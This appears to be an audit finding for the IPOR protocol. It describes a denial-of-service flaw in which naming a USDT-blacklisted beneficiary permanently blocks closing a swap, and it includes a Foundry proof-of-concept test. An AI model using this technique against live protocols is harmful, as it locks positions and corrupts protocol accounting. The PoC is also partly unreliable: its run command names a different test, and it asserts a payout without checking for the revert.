## Summary
Permanent swap lock due to blacklisted address
A swap position cannot be closed indefinitely if the beneficiary address is blacklisted while using USDT or USDC as the swap asset. This results in a persistent protocol state inconsistency, leading to incorrect values in critical system variables.


## Vulnerability Detail
### **Swap Closing Flow**
The swap closing function follows this sequence:

```
IporProtocolRouter.closeSwapsUsdt()
    → AmmCloseSwapServiceUsdt.closeSwapsUsdt()
        → AmmCloseSwapServiceStable._closeSwaps()
            → AmmCloseSwapServiceStable._closeSwapsPerLeg()
                → AmmCloseSwapServiceStable._closeSwapPayFixed()
                    → AmmCloseSwapServiceStable._transferTokensBasedOnPnlValue()
                        → AmmCloseSwapServiceStable._transferDerivativeAmount()
```

In `AmmCloseSwapServiceStable.sol`, the `_transferDerivativeAmount()` function is implemented as follows:

```solidity
File: AmmCloseSwapServiceStable.sol
535: function _transferDerivativeAmount(
536:     address beneficiary,
537:     address buyer,
538:     uint256 wadLiquidationDepositAmount,
539:     uint256 wadTransferAmount,
540:     IAmmCloseSwapLens.AmmCloseSwapServicePoolConfiguration memory poolCfg
541: ) internal returns (uint256 wadTransferredToBuyer, uint256 wadPayoutForLiquidator) {
...
601: 
602:     IERC20Upgradeable(poolCfg.asset).safeTransferFrom(poolCfg.ammTreasury, buyer, transferAmountAssetDecimals);
603: 
604:     wadTransferredToBuyer = IporMath.convertToWad(transferAmountAssetDecimals, poolCfg.decimals);
605: }
606: }
```

### **Issue Explanation**
- If `poolCfg.asset` is **USDT or USDC** and the `buyer` is a **blacklisted address**, the token transfer in **L602** will fail.
- This prevents the swap from being closed, locking the position **forever**.

## Impact
A malicious actor can intentionally open a swap by specifying a **blacklisted address** as the beneficiary. As a result:

1. **Swap cannot be closed or liquidated**
   - The swap remains open indefinitely, preventing normal operations.

2. **Critical protocol state variables become permanently incorrect**
   - SpreadStorageLibs.timeWeightedNotional
   - AmmStorage._balances.totalCollateral
   - AmmStorage._soapIndicators

## Code Snippet
https://github.com/IPOR-Labs/ipor-protocol/blob/383a3fd2efdc82d9a29f25e96c8e2d6720028cf3/contracts/amm/AmmCloseSwapServiceStable.sol#L602

## Tool used
Manual Review

## Proof of Concept
```solidity
    /**
     * @dev This test verifies that a swap cannot be closed by a legitimate liquidator 
     *      if the swap beneficiary is a blacklisted address.
     * 
     * Conditions:
     * 1. Swap asset: USDT or USDC.
     * 2. Swap beneficiary: Blacklisted address.
     *
     * Run this test using:
     * ```
     * forge test -vvvv --match-test testCannotCloseSwapByLiquidatorAfterMaturity
     * ```
     */
    function testCannotClosePayFixedAsLiquidatorAfterMaturity() public {
        //given
        _iporProtocol = _iporProtocolFactory.getUsdtInstance(_cfg);
        MockTestnetToken asset = _iporProtocol.asset;

        uint256 liquidityAmount = 1_000_000 * 1e6;
        uint256 totalAmount = 10_000 * 1e6;
        uint256 acceptableFixedInterestRate = 10 * 10 ** 16;
        uint256 leverage = 100 * 10 ** 18;

        //
        // This address is a banned address from https://dune.com/phabc/usdt---banned-addresses
        //
        address maliciousSwapBeneficiary = 0xcaCa5575eB423183bA4B6EE3aA9fc2cB488aEEEE;

        asset.approve(address(_iporProtocol.router), liquidityAmount);
        _iporProtocol.ammPoolsService.provideLiquidityUsdt(_admin, liquidityAmount);

        asset.transfer(_buyer, totalAmount);

        vm.prank(_buyer);
        asset.approve(address(_iporProtocol.router), totalAmount);

        uint256 buyerBalanceBefore = _iporProtocol.asset.balanceOf(_buyer);
        uint256 adminBalanceBefore = _iporProtocol.asset.balanceOf(_admin);
        uint256 liquidatorBalanceBefore = _iporProtocol.asset.balanceOf(_liquidator);

        vm.startPrank(_buyer);
        uint256 swapId = _iporProtocol.ammOpenSwapService.openSwapPayFixed28daysUsdt(
            maliciousSwapBeneficiary,   // @audit: Malicious user passes a banned address here.
            totalAmount,
            acceptableFixedInterestRate,
            leverage,
            getRiskIndicatorsInputs(0)
        );
        vm.stopPrank();

        vm.warp(100 + 28 days + 1 seconds);

        _iporProtocol.ammGovernanceService.addSwapLiquidator(address(_iporProtocol.asset), _liquidator);

        uint256[] memory swapPfIds = new uint256[](1);
        swapPfIds[0] = 1;
        uint256[] memory swapRfIds = new uint256[](0);

        //when
        vm.startPrank(_liquidator);
        _iporProtocol.ammCloseSwapServiceUsdt.closeSwapsUsdt(
            _liquidator,
            swapPfIds,
            swapRfIds,
            getCloseRiskIndicatorsInputs(address(_iporProtocol.asset), IporTypes.SwapTenor.DAYS_28)
        );
        vm.stopPrank();

        //then
        uint256 buyerBalanceAfter = _iporProtocol.asset.balanceOf(_buyer);
        uint256 adminBalanceAfter = _iporProtocol.asset.balanceOf(_admin);
        uint256 liquidatorBalanceAfter = _iporProtocol.asset.balanceOf(_liquidator);

        // assertEq(buyerBalanceBefore - buyerBalanceAfter, 73075873);
        // assertEq(adminBalanceAfter - adminBalanceBefore, 0);
        assertEq(liquidatorBalanceAfter - liquidatorBalanceBefore, 25000000);
    }
```